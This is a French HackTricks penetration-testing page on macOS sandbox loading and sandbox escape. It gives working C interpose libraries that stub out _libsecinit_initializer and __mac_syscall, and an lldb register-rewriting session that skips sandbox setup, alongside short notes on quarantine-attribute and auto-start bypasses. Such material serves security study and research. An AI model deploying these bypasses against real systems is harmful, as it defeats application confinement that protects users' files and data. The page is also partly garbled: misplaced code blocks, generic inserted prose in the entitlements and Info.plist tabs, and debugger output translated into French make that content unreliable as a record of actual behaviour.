# Débogage et contournement du sandbox macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Processus de chargement du sandbox

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Image de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Sur l'image précédente, il est possible d'observer **comment le sandbox sera chargé** lorsqu'une application avec l'entitlement **`com.apple.security.app-sandbox`** est exécutée.

Le compilateur liera `/usr/lib/libSystem.B.dylib` au binaire.

Ensuite, **`libSystem.B`** appellera plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les entitlements de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur du sandbox, et le cas échéant, il sera mis en quarantaine.\
Enfin, le sandbox sera activé par un appel à **`__sandbox_ms`** qui appellera **`__mac_syscall`**.

## Possibles contournements

### Contournement de l'attribut de quarantaine

Les **fichiers créés par des processus sandbox** se voient attribuer l'**attribut de quarantaine** pour empêcher l'évasion du sandbox. Cependant, si vous parvenez à **créer un dossier `.app` sans l'attribut de quarantaine** à l'intérieur d'une application sandbox, vous pourriez faire en sorte que le binaire du bundle de l'application pointe vers **`/bin/bash`** et ajouter quelques variables d'environnement dans le **plist** pour abuser de la fonctionnalité **`open`** et **lancer la nouvelle application sans sandbox**.

C'est ce qui a été fait dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Par conséquent, pour le moment, si vous êtes simplement capable de créer un dossier portant un nom se terminant par **`.app`** sans attribut de quarantaine, vous pouvez échapper au sandbox car macOS ne **vérifie** que l'**attribut de quarantaine** dans le **dossier `.app`** et dans l'**exécutable principal** (et nous pointerons l'exécutable principal vers **`/bin/bash`**).
{% endhint %}

### Abus de la fonctionnalité Open

Dans les [**derniers exemples de contournement du sandbox Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), on peut voir comment la fonctionnalité **`open`** de la ligne de commande peut être abusée pour contourner le sandbox.

### Abus des emplacements de démarrage automatique

Si un processus sandbox peut **écrire** à un endroit où **plus tard une application sans sandbox va exécuter le binaire**, il pourra **s'échapper simplement en plaçant** le binaire là-bas. Un bon exemple de ce type d'emplacements sont `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Pour cela, vous pourriez même avoir besoin de **2 étapes** : faire en sorte qu'un processus avec un sandbox **plus permissif** (`file-read*`, `file-write*`) exécute votre code qui écrira effectivement à un endroit où il sera **exécuté sans sandbox**.

Consultez cette page sur les **emplacements de démarrage automatique** :

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Abus d'autres processus

Si à partir du processus sandbox, vous êtes capable de **compromettre d'autres processus** s'exécutant dans des sandboxes moins restrictives (ou aucune), vous pourrez vous échapper vers leurs sandboxes :

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Compilation statique et liaison dynamique

[Cette recherche](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de contourner le sandbox. Parce que le sandbox est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais mis en sandbox :

* Si le binaire était **complètement compilé en statique**, il pourrait éviter de charger cette bibliothèque.
* Si le **binaire n'avait pas besoin de charger de bibliothèques** (parce que le lien est également dans libSystem), il n'aurait pas besoin de charger libSystem.&#x20;
### Shellcodes

Notez que **même les shellcodes** en ARM64 doivent être liés à `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Autorisations

Notez que même si certaines **actions** peuvent être **autorisées par le sandbox**, si une application dispose d'une **autorisation spécifique**, comme dans l'exemple suivant :
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Contournement de l'interposition

Pour plus d'informations sur l'**interposition**, consultez :

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interposer `_libsecinit_initializer` pour éviter le sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interposer `__mac_syscall` pour contourner le Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Déboguer et contourner le bac à sable avec lldb

Compilons une application qui devrait être sandboxée :

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}

Le fichier `entitlements.xml` contient les autorisations spécifiques accordées à une application macOS pour accéder à certaines fonctionnalités ou ressources du système. Ces autorisations sont définies à l'aide de clés et de valeurs spécifiques dans le fichier XML.

Voici un exemple de fichier `entitlements.xml` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>
    <key>com.apple.security.network.client</key>
    <true/>
    <key>com.apple.security.print</key>
    <true/>
</dict>
</plist>
```

Dans cet exemple, l'application a les autorisations suivantes :

- `com.apple.security.app-sandbox` : autorise l'application à s'exécuter dans un bac à sable.
- `com.apple.security.files.user-selected.read-write` : autorise l'application à lire et écrire des fichiers sélectionnés par l'utilisateur.
- `com.apple.security.network.client` : autorise l'application à accéder au réseau.
- `com.apple.security.print` : autorise l'application à imprimer.

Ces autorisations peuvent être utilisées pour restreindre les actions qu'une application peut effectuer et renforcer la sécurité du système macOS.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

Le fichier Info.plist est un fichier de configuration utilisé par les applications macOS pour définir leurs paramètres et comportements. Il contient des informations telles que le nom de l'application, son identifiant de bundle, les autorisations requises, les services système utilisés, etc. Ce fichier est essentiel pour le bon fonctionnement de l'application et est généralement situé dans le bundle de l'application.

Dans le contexte du sandboxing, le fichier Info.plist est utilisé pour déclarer les autorisations nécessaires à l'application pour accéder à certaines ressources système. Ces autorisations sont définies à l'aide de clés spécifiques dans le fichier Info.plist. Par exemple, l'autorisation d'accéder au réseau peut être déclarée en utilisant la clé "com.apple.security.network.client".

Il est important de noter que le fichier Info.plist est signé numériquement pour garantir son intégrité et empêcher toute modification non autorisée. La signature numérique est vérifiée par le système d'exploitation lors du lancement de l'application.

Lors de l'analyse d'une application macOS, il est essentiel de vérifier le contenu du fichier Info.plist pour comprendre les autorisations demandées par l'application et évaluer les risques potentiels liés à ces autorisations.
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Ensuite, compilez l'application :

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, ce que le **Sandbox n'autorisera pas**.\
Créez un fichier à cet endroit car une fois que le Sandbox est contourné, il pourra le lire :
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Déboguons l'application pour voir quand le Sandbox est chargé :
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp
# Pour contourner, sautez à l'adresse b.lo en modifiant d'abord certains registres
(lldb) breakpoint delete 1 # Supprimer le point d'arrêt
(lldb) register write $pc 0x187659928 # Adresse b.lo
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Processus 2517 en cours de reprise
Contournement du bac à sable réussi !
Processus 2517 terminé avec le statut = 0 (0x00000000)
```
{% hint style="warning" %}
**Même si le contournement du Sandbox est effectué, TCC** demandera à l'utilisateur s'il souhaite autoriser le processus à lire les fichiers du bureau.
{% endhint %}

## Références

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
